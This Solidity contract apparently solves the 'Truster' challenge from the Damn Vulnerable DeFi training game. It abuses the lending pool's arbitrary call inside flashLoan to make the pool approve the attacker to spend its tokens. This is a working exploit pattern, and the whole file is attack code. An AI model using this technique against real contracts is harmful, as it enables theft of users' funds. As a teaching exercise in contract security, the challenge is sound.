// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "../DamnValuableToken.sol";
import "./TrusterLenderPool.sol";
/**
 * @title TrusterLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract AttackTruster {
    using Address for address;

TrusterLenderPool pool;
    DamnValuableToken public immutable token;

    constructor(address _pool , address _token) {
        pool = TrusterLenderPool(_pool);
        token=DamnValuableToken(_token);
    }

    function attack(uint256 amount , address player )
        public
    {

        pool.flashLoan(0 , player , address(token) , abi.encodeWithSignature("approve(address,uint256)", player, amount)); //.transfer(borrower, amount);
    }
}
